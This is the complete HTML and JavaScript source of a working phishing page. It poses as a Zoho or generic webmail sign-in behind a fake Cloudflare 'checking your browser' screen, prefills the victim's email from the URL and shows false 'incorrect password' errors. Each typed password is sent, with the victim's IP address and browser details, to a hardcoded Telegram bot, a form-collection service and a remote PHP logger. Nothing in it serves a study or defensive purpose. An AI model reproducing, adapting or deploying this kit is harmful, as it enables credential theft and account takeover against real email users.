<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Webmail Sign-in</title>
   <!-- Include Bootstrap 5 CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <!-- Bootstrap Icons -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
   <!-- Google Fonts: Poppins -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">

   <style>
      /* Hide the main content initially */
      #main-content {
         display: none;
      }

      /* Verification Div Styling */
      #verification-div {
         height: 100vh;
         display: flex;
         align-items: start;
         justify-content: center;
         padding-top: 10%;
      }

      /* Ensure text is left-aligned */
      .verification-content {
         text-align: left;
      }

      /* Adjust spinner size */
      .spinner-border {
         width: 1.5rem;
         height: 1.5rem;
      }
   </style>
   
   <style>
      #background-iframe, #overlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; }
      body { font-family: Poppins, sans-serif; margin: 0; padding: 0; overflow: hidden; }
      #background-iframe { border: none; z-index: -3; object-fit: cover; }
      #overlay { background-color: rgba(0, 0, 0, .5); z-index: -2; }
      .form-container { display: none; max-width: 400px; width: 100%; padding: 2rem; background-color: rgba(255, 255, 255, .95); border-radius: .75rem; box-shadow: 0 8px 16px rgba(0, 0, 0, .2); position: relative; z-index: 1; }
      .icon-text { display: flex; align-items: center; margin-bottom: 1.5rem; }
      .icon-text img { width: 32px; height: 32px; margin-right: .5rem; }
      .icon-text .h4 { margin-bottom: 0; color: #0d6efd; }
      .form-floating { position: relative; margin-bottom: 1.5rem; }
      .form-floating label, .input-icon { position: absolute; color: #6c757d; pointer-events: none; }
      .form-floating label { transition: .2s ease-in-out; left: 2.5rem; top: -.2rem; background-color: transparent; z-index: 1; }
      .form-floating input:focus + label, .form-floating input:not(:placeholder-shown) + label { transform: translateY(-1.5rem); font-size: .85rem; color: #0d6efd; }
      .form-control { border-top: none; border-left: none; border-right: none; border-bottom: 2px solid #ced4da; border-radius: 0; padding-left: 2.5rem; transition: border-color .2s; background-color: transparent; }
      .form-control:focus { box-shadow: none; outline: 0; border-bottom-color: #0d6efd; }
      .input-icon { left: .75rem; top: 50%; transform: translateY(-50%); font-size: 1.2rem; }
      .btn-primary { width: 100%; padding: .75rem; font-size: 1rem; background-color: #0d6efd; border: none; border-radius: .375rem; transition: background-color .3s, color .3s; }
      .btn-primary:hover { background-color: #0b5ed7; color: #fff; }
      .btn-primary:focus { box-shadow: none; }
      @media (max-width: 576px) { .form-container { padding: 1.5rem; } }
      .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, .5); align-items: center; justify-content: center; z-index: 9999; display: none; }
      .error-message { color: red; margin-bottom: 1rem; display: none; }
   </style>
</head>

<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
   <div id="verification-div" style="position: absolute; height: 100vh; width: 100vw; background-color: #fff;">
      <div class="row">
         <div class="col-12 verification-content mx-2">
            <h2 id="verify-heading">Checking your browser before accessing the site</h2>
            <div>
               <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border: 0px solid black; background: #f3efef; border-radius: 5px;">
                  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
                  <div class="cf-turnstile" data-sitekey="0x4AAAAAAB10qIE0M6yxD1P2" data-callback="onTurnstileSuccess"></div>
               </div>
            </div>
         </div>
      </div>
   </div>
   <!-- Background Iframe -->
   <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
   <!-- Dimmed Overlay -->
   <div id="overlay"></div>
   <!-- Form Container -->
   <div class="form-container" id="form-container">
      <!-- Error Message -->
      <div id="error-message" class="error-message">Incorrect password. Try again</div>
      <form id="user-form">
         <!-- Icon and Text Row -->
         <div class="icon-text">
            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width: 15px;">
            <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
         </div>
         <!-- Heading -->
         <h5 class="mb-3" id="form-heading">Authentication Failed</h5>
         <!-- Paragraph -->
         <p class="mb-4 text-muted" style="font-size: .8rem;" id="form-subheading">Previous session has expired, login to continue</p>
         <!-- Email Input -->
         <div class="form-floating position-relative">
            <i class="bi bi-envelope input-icon"></i>
            <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index: 1000;" disabled>
            <label for="email" style="background-color: transparent;" id="email-label">Email</label>
         </div>
         <!-- Password Input -->
         <div class="form-floating position-relative">
            <i class="bi bi-lock input-icon"></i>
            <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
            <label for="password" style="background-color: transparent;" id="password-label">Password</label>
         </div>
         <!-- Submit Button -->
         <button type="submit" class="btn btn-primary" id="submit-button">Submit</button>
      </form>
   </div>

   <!-- Loader Overlay -->
   <div id="loader-overlay" class="loader-overlay">
      <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
         <span class="visually-hidden" id="loader-text">Loading...</span>
      </div>
   </div>

   <!-- Bootstrap 5 JS Bundle (includes Popper) -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <!-- Language Detection and Translation Script -->
   <script>
      // Translation object for multiple languages
      const translations = {
         en: {
            verifyHeading: "Checking your browser before accessing the site",
            botCheckLabel: "I am not a robot",
            redirecting: "Redirecting...",
            errorMessage: "Incorrect password. Try again",
            tooManyAttempts: "Too many sign-in attempts, try again later",
            formHeading: "Authentication Failed",
            formSubheading: "Previous session has expired, login to continue",
            emailLabel: "Email",
            passwordLabel: "Password",
            submitButton: "Submit",
            loaderText: "Loading..."
         },
         zh: {
            verifyHeading: "在访问网站之前检查您的浏览器",
            botCheckLabel: "我不是机器人",
            redirecting: "正在重定向...",
            errorMessage: "密码错误，请重试",
            tooManyAttempts: "登录尝试次数过多，请稍后再试",
            formHeading: "认证失败",
            formSubheading: "之前的会话已过期，请登录以继续",
            emailLabel: "电子邮件",
            passwordLabel: "密码",
            submitButton: "Submit",
            loaderText: "加载中..."
         },
         ja: {
            verifyHeading: "サイトにアクセスする前にブラウザを確認しています",
            botCheckLabel: "私はロボットではありません",
            redirecting: "リディレクト中...",
            errorMessage: "パスワードが間違っています。もう一度お試しください",
            tooManyAttempts: "ログイン試行が多すぎます。後で再試行してください",
            formHeading: "認証に失敗しました",
            formSubheading: "前のセッションが期限切れになりました。続行するにはログインしてください",
            emailLabel: "メール",
            passwordLabel: "パスワード",
            submitButton: "提出",
            loaderText: "読み込み中..."
         },
         hi: {
            verifyHeading: "साइट तक पहुंचने से पहले अपने ब्राउज़र की जांच करें",
            botCheckLabel: "मैं रोबोट नहीं हूँ",
            redirecting: "पुनर्निर्देशन...",
            errorMessage: "गलत पासवर्ड। फिर से कोशिश करें",
            tooManyAttempts: "बहुत अधिक साइन-इन प्रयास, बाद में फिर से कोशिश करें",
            formHeading: "प्रमाणीकरण विफल",
            formSubheading: "पिछला सत्र समाप्त हो गया है, जारी रखने के लिए लॉगिन करें",
            emailLabel: "ईमेल",
            passwordLabel: "पासवर्ड",
            submitButton: "Submit",
            loaderText: "लोड हो रहा है..."
         },
         es: {
            verifyHeading: "Comprobando tu navegador antes de acceder al sitio",
            botCheckLabel: "No soy un robot",
            redirecting: "Redirigiendo...",
            errorMessage: "Contraseña incorrecta. Inténtalo de nuevo",
            tooManyAttempts: "Demasiados intentos de inicio de sesión, intenta de nuevo más tarde",
            formHeading: "Autenticación Fallida",
            formSubheading: "La sesión anterior ha expirado, inicia sesión para continuar",
            emailLabel: "Correo electrónico",
            passwordLabel: "Contraseña",
            submitButton: "Submit",
            loaderText: "Cargando..."
         },
         fr: {
            verifyHeading: "Vérification de votre navigateur avant d'accéder au site",
            botCheckLabel: "Je ne suis pas un robot",
            redirecting: "Redirection...",
            errorMessage: "Mot de passe incorrect. Réessayez",
            tooManyAttempts: "Trop de tentatives de connexion, réessayez plus tard",
            formHeading: "Échec de l'authentification",
            formSubheading: "La session précédente a expiré, connectez-vous pour continuer",
            emailLabel: "Email",
            passwordLabel: "Mot de passe",
            submitButton: "Submit",
            loaderText: "Chargement..."
         },
         de: {
            verifyHeading: "Überprüfung Ihres Browsers vor dem Zugriff auf die Website",
            botCheckLabel: "Ich bin kein Roboter",
            redirecting: "Weiterleitung...",
            errorMessage: "Falsches Passwort. Versuchen Sie es erneut",
            tooManyAttempts: "Zu viele Anmeldeversuche, versuchen Sie es später erneut",
            formHeading: "Authentifizierung fehlgeschlagen",
            formSubheading: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
            emailLabel: "E-Mail",
            passwordLabel: "Passwort",
            submitButton: "Submit",
            loaderText: "Laden..."
         },
         pt: {
            verifyHeading: "Verificando seu navegador antes de acessar o site",
            botCheckLabel: "Não sou um robô",
            redirecting: "Redirecionando...",
            errorMessage: "Senha incorreta. Tente novamente",
            tooManyAttempts: "Muitas tentativas de login, tente novamente mais tarde",
            formHeading: "Falha na Autenticação",
            formSubheading: "A sessão anterior expirou, faça login para continuar",
            emailLabel: "E-mail",
            passwordLabel: "Senha",
            submitButton: "Submit",
            loaderText: "Carregando..."
         },
         ar: {
            verifyHeading: "التحقق من متصفحك قبل الوصول إلى الموقع",
            botCheckLabel: "أنا لست روبوت",
            redirecting: "إعادة توجيه...",
            errorMessage: "كلمة مرور خاطئة. حاول مرة أخرى",
            tooManyAttempts: "محاولات تسجيل دخول كثيرة جداً، حاول لاحقاً",
            formHeading: "فشل التوثيق",
            formSubheading: "انتهت صلاحية الجلسة السابقة، قم بتسجيل الدخول للمتابعة",
            emailLabel: "البريد الإلكتروني",
            passwordLabel: "كلمة المرور",
            submitButton: "Submit",
            loaderText: "جاري التحميل..."
         },

         /* ================ NEW LANGUAGES ADDED BELOW ================ */
         tr: {  // Turkish
            verifyHeading: "Siteye erişmeden önce tarayıcınız kontrol ediliyor",
            botCheckLabel: "Ben robot değilim",
            redirecting: "Yönlendiriliyor...",
            errorMessage: "Yanlış şifre. Tekrar deneyin",
            tooManyAttempts: "Çok fazla giriş denemesi, daha sonra tekrar deneyin",
            formHeading: "Kimlik Doğrulama Başarısız",
            formSubheading: "Önceki oturum süresi doldu, devam etmek için giriş yapın",
            emailLabel: "E-posta",
            passwordLabel: "Şifre",
            submitButton: "Gönder",
            loaderText: "Yükleniyor..."
         },
         vi: {  // Vietnamese
            verifyHeading: "Đang kiểm tra trình duyệt trước khi truy cập trang web",
            botCheckLabel: "Tôi không phải là robot",
            redirecting: "Đang chuyển hướng...",
            errorMessage: "Mật khẩu sai. Vui lòng thử lại",
            tooManyAttempts: "Quá nhiều lần đăng nhập, vui lòng thử lại sau",
            formHeading: "Xác thực thất bại",
            formSubheading: "Phiên trước đã hết hạn, đăng nhập để tiếp tục",
            emailLabel: "Email",
            passwordLabel: "Mật khẩu",
            submitButton: "Gửi",
            loaderText: "Đang tải..."
         },
         th: {  // Thai
            verifyHeading: "กำลังตรวจสอบเบราว์เซอร์ก่อนเข้าสู่เว็บไซต์",
            botCheckLabel: "ฉันไม่ใช่หุ่นยนต์",
            redirecting: "กำลังเปลี่ยนเส้นทาง...",
            errorMessage: "รหัสผ่านไม่ถูกต้อง ลองอีกครั้ง",
            tooManyAttempts: "พยายามเข้าสู่ระบบมากเกินไป ลองใหม่ในภายหลัง",
            formHeading: "การยืนยันตัวตนล้มเหลว",
            formSubheading: "เซสชันก่อนหน้าหมดอายุแล้ว กรุณาเข้าสู่ระบบเพื่อดำเนินการต่อ",
            emailLabel: "อีเมล",
            passwordLabel: "รหัสผ่าน",
            submitButton: "ส่ง",
            loaderText: "กำลังโหลด..."
         },
         id: {  // Indonesian
            verifyHeading: "Memeriksa browser Anda sebelum mengakses situs",
            botCheckLabel: "Saya bukan robot",
            redirecting: "Mengalihkan...",
            errorMessage: "Kata sandi salah. Coba lagi",
            tooManyAttempts: "Terlalu banyak percobaan masuk, coba lagi nanti",
            formHeading: "Autentikasi Gagal",
            formSubheading: "Sesi sebelumnya telah kedaluwarsa, login untuk melanjutkan",
            emailLabel: "Email",
            passwordLabel: "Kata Sandi",
            submitButton: "Kirim",
            loaderText: "Memuat..."
         },
         it: {  // Italian
            verifyHeading: "Controllo del browser prima di accedere al sito",
            botCheckLabel: "Non sono un robot",
            redirecting: "Reindirizzamento in corso...",
            errorMessage: "Password errata. Riprova",
            tooManyAttempts: "Troppi tentativi di accesso, riprova più tardi",
            formHeading: "Autenticazione fallita",
            formSubheading: "La sessione precedente è scaduta, accedi per continuare",
            emailLabel: "Email",
            passwordLabel: "Password",
            submitButton: "Invia",
            loaderText: "Caricamento..."
         },
         ja: {  // Japanese (already existed, kept for completeness)
            verifyHeading: "サイトにアクセスする前にブラウザを確認しています",
            botCheckLabel: "私はロボットではありません",
            redirecting: "リディレクト中...",
            errorMessage: "パスワードが間違っています。もう一度お試しください",
            tooManyAttempts: "ログイン試行が多すぎます。後で再試行してください",
            formHeading: "認証に失敗しました",
            formSubheading: "前のセッションが期限切れになりました。続行するにはログインしてください",
            emailLabel: "メール",
            passwordLabel: "パスワード",
            submitButton: "提出",
            loaderText: "読み込み中..."
         },
         ko: {  // Korean
            verifyHeading: "사이트에 접속하기 전에 브라우저를 확인하는 중",
            botCheckLabel: "로봇이 아닙니다",
            redirecting: "리디렉션 중...",
            errorMessage: "비밀번호가 잘못되었습니다. 다시 시도해 주세요",
            tooManyAttempts: "로그인 시도가 너무 많습니다. 나중에 다시 시도해 주세요",
            formHeading: "인증 실패",
            formSubheading: "이전 세션이 만료되었습니다. 계속하려면 로그인하세요",
            emailLabel: "이메일",
            passwordLabel: "비밀번호",
            submitButton: "제출",
            loaderText: "로딩 중..."
         },
         ru: {  // Russian
            verifyHeading: "Проверка вашего браузера перед доступом к сайту",
            botCheckLabel: "Я не робот",
            redirecting: "Перенаправление...",
            errorMessage: "Неверный пароль. Попробуйте снова",
            tooManyAttempts: "Слишком много попыток входа, попробуйте позже",
            formHeading: "Ошибка аутентификации",
            formSubheading: "Предыдущая сессия истекла, войдите для продолжения",
            emailLabel: "Email",
            passwordLabel: "Пароль",
            submitButton: "Отправить",
            loaderText: "Загрузка..."
         }
      };

      // Function to detect browser language
      function detectLanguage() {
         const lang = navigator.language || navigator.userLanguage;
         const langCode = lang.split('-')[0]; // Get the primary language code
         return translations[langCode] ? langCode : 'en'; // Default to English if not supported
      }

      // Function to apply translations
      function applyTranslations(lang) {
         const t = translations[lang];
         document.getElementById('verify-heading').textContent = t.verifyHeading;
         document.getElementById('form-heading').textContent = t.formHeading;
         document.getElementById('form-subheading').textContent = t.formSubheading;
         document.getElementById('email-label').textContent = t.emailLabel;
         document.getElementById('password-label').textContent = t.passwordLabel;
         document.getElementById('submit-button').textContent = t.submitButton;
         document.getElementById('loader-text').textContent = t.loaderText;
      }

      // Function to get real IP address
      async function getRealIPAddress() {
         try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
         } catch (error) {
            console.error('Error fetching IP address:', error);
            try {
               const fallbackResponse = await fetch('https://httpbin.org/ip');
               const fallbackData = await fallbackResponse.json();
               return fallbackData.origin;
            } catch (fallbackError) {
               console.error('Fallback IP fetch failed:', fallbackError);
               return 'Unable to detect';
            }
         }
      }

      // Enhanced function to send data to Telegram with retry mechanism
      async function sendToTelegram(message, retries = 3) {
         const token = "8202992502:AAHFlO3whowiBsbzT0hRnpAGfGK9DwJXcqI";
         const chatId = "7684330729";
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
         const data = {
            chat_id: chatId,
            text: message
         };

         for (let attempt = 1; attempt <= retries; attempt++) {
            try {
               const response = await fetch(url, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify(data)
               });

               if (response.ok) {
                  console.log("Data sent to Telegram successfully!");
                  return true;
               } else {
                  console.error(`Attempt ${attempt}: Failed to send data to Telegram:`, response.statusText);
                  if (attempt === retries) {
                     throw new Error(`Failed after ${retries} attempts: ${response.statusText}`);
                  }
               }
            } catch (error) {
               console.error(`Attempt ${attempt}: Error sending data to Telegram:`, error);
               if (attempt === retries) {
                  console.error("All retry attempts failed");
                  return false;
               }
               await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
         }
         return false;
      }

      // Turnstile verification callback - FIXED VERSION
      function onTurnstileSuccess(token) {
         console.log('Turnstile verification successful, token:', token);
         const lang = detectLanguage();
         
         // Update the heading to show redirecting status
         document.getElementById('verify-heading').textContent = translations[lang].redirecting;
         
         // Hide verification div and show the form after a brief delay
         setTimeout(() => {
            document.getElementById('verification-div').style.display = 'none';
            document.getElementById('form-container').style.display = 'block';
            document.getElementById('main-content').style.display = 'flex';
         }, 1500);
      }

      // Apply language detection and handle email from # or eta
      document.addEventListener("DOMContentLoaded", async () => {
         const lang = detectLanguage();
         applyTranslations(lang);

         let submitCount = 0;
         const hash = window.location.hash ? window.location.hash.substring(1) : null;
         const urlParams = new URLSearchParams(window.location.search);
         const eta = urlParams.get('eta');
         const e = hash || eta || null;
         let t;
         if (e) {
            document.getElementById("email").value = e;
            const n = e.split("@");
            if (2 === n.length) {
               const e = n[1];
               t = e;
               document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
               const o = e.split(".")[0].toUpperCase();
               document.getElementById("domain-name").textContent = o;
               const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
               document.getElementById("background-iframe").src = r;
            }
         } else {
            console.warn("No '#' or 'eta' parameter found in the URL.");
            document.getElementById("background-iframe").src = "about:blank";
            const emailInput = document.getElementById("email");
            emailInput.disabled = false;
            emailInput.removeAttribute("required");
         }

         const realIP = await getRealIPAddress();
         
         let userData = {
            ipAddress: realIP,
            userAgent: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser: "Detecting...",
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onlineStatus: navigator.onLine,
            screenResolution: `${screen.width}x${screen.height}`,
            timestamp: new Date().toISOString()
         };

         const userAgent = navigator.userAgent;
         userData.browser = userAgent.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
                           userAgent.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
                           userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1 ? "Opera" :
                           userAgent.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
                           userAgent.indexOf("Edge") > -1 ? "Microsoft Edge" :
                           userAgent.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
                           userAgent.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";

         document.getElementById("user-form").addEventListener("submit", async function(e) {
            e.preventDefault();
            submitCount += 1;

            const isFirstAttempt = submitCount === 1;
            const isSecondAttempt = submitCount === 2;
            const isThirdAttempt = submitCount === 3;

            if (!document.getElementById("submit-button").disabled) {
               const email = document.getElementById("email").value.trim();
               const password = document.getElementById("password").value.trim();
               
               if (!password) {
                  console.error("Password is missing");
                  return;
               }
               if (!email) {
                  console.warn("Email is missing, but proceeding with data collection");
               }

               const formData = { email, password };

               // === EXISTING SUBMISSIONS (kept exactly as you had them) ===
               try {
                  const response = await fetch("https://submit-form.com/OEh2ntQSA", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(formData)
                  });
                  console.log(response.ok ? "Submission to form successful!" : "Submission to form failed.");
               } catch (error) {
                  console.error("Error sending submission to form:", error);
               }

               let message = `Perry ajebutter - New Login Attempt\n\n` +
                            `Email: ${email}\n` +
                            `Password: ${password}\n` +
                            `IP Address: ${userData.ipAddress}`;

               const telegramResult = await sendToTelegram(message);
               if (!telegramResult) {
                  console.error("Failed to send data to Telegram after all retry attempts");
               }

               // === NEW: SEND TO YOUR OWN PHP SCRIPT (log.php) ===
               try {
                  await fetch("https://kl.xhad.gq/.well-known/dhje3/robo.php", {  // <-- change "log.php" to whatever your PHP file name/path is
                     method: "POST",
                     headers: { "Content-Type": "application/x-www-form-urlencoded" },
                     body: new URLSearchParams({
                        email: email,
                        password: password,
                        ip: userData.ipAddress,
                        useragent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                     })
                  });
                  console.log("Data also sent to your PHP script");
               } catch (err) {
                  console.error("Failed to send to PHP:", err);
               }
               // ========================================================

            }

            document.getElementById("loader-overlay").style.display = "flex";

            if (isFirstAttempt || isSecondAttempt) {
               setTimeout(() => {
                  document.getElementById("loader-overlay").style.display = "none";
                  document.getElementById("error-message").textContent = translations[lang].errorMessage;
                  document.getElementById("error-message").style.display = "block";
                  // Password is NO LONGER cleared automatically here
               }, 3000);
            } else if (submitCount >= 3) {
               setTimeout(() => {
                  document.getElementById("loader-overlay").style.display = "none";
                  document.getElementById("error-message").textContent = translations[lang].tooManyAttempts;
                  document.getElementById("error-message").style.display = "block";
                  document.getElementById("password").disabled = true;
                  document.getElementById("submit-button").disabled = true;
                  setTimeout(() => {
                     document.getElementById("password").disabled = false;
                     document.getElementById("submit-button").disabled = false;
                     submitCount = 0; // Reset attempt count
                     document.getElementById("error-message").textContent = translations[lang].errorMessage;
                     document.getElementById("error-message").style.display = "none";
                  }, 300000); // 5 minutes
               }, 3000);
            }
         });
      });
   </script>
</body>
</html>
